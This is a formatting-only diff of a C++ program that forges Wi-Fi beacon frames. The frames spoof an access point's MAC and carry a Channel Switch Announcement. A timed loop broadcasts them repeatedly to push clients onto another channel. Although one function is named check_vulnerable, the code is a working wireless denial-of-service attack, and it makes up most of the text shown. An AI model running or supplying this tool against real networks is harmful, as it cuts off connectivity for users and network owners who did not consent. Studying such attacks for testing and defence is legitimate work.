@@ -12,8 +12,8 @@ void send_CSA_beacon(const HWAddress<6> &ap_mac,
                      const NetworkInterface &iface,
                      const string &ssid,
                      const int ap_channel,
-                     const int new_channel) {
-
+                     const int new_channel
+){
     Dot11Beacon beacon;
     beacon.addr1(Dot11::BROADCAST);
     beacon.addr2(ap_mac);
@@ -40,28 +40,30 @@ void check_vulnerable(
     const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac,
     const string &iface_name, const string &ssid,
     const int ap_channel, const int new_channel,
-    const int ms_interval, const int attack_time){
-
+    const int ms_interval, const int attack_time
+){
     const NetworkInterface iface(iface_name);
     const auto start_time = steady_clock::now();
     const auto end_time = start_time + seconds(attack_time);
 
-    while (steady_clock::now() < end_time) {
+    while(steady_clock::now() < end_time){
         send_CSA_beacon(ap_mac, iface, ssid, ap_channel, new_channel);
         this_thread::sleep_for(milliseconds(ms_interval));
     }
 
     cout << "check_vulnerable called with:\n"
-              << "AP MAC: " << ap_mac << "\n"
-              << "STA MAC: " << sta_mac << "\n"
-              << "Interface: " << iface_name << "\n"
-              << "Channel: " << ap_channel << "\n"
-              << "SSID: " << ssid << endl;
+            << "AP MAC: " << ap_mac << "\n"
+            << "STA MAC: " << sta_mac << "\n"
+            << "Interface: " << iface_name << "\n"
+            << "Channel: " << ap_channel << "\n"
+            << "SSID: " << ssid << endl;
 }
 
-int main(const int argc, char* argv[]){
+int main(const int argc, char *argv[]){
     if(argc != 9){
-        cout << "Usage: " << argv[0] << " <ap_mac> <sta_mac> <iface_name> <ssid> <ap_channel> <new_channel> <ms_interval> <attack_time>" << endl;
+        cout << "Usage: " << argv[0] <<
+                " <ap_mac> <sta_mac> <iface_name> <ssid> <ap_channel> <new_channel> <ms_interval> <attack_time>" <<
+                endl;
         cout << "Example: " << argv[0] << " 00:11:22:33:44:55 aa:bb:cc:dd:ee:ff wlan0 test ssid 6 11 100 10" << endl;
         return 1;
     }
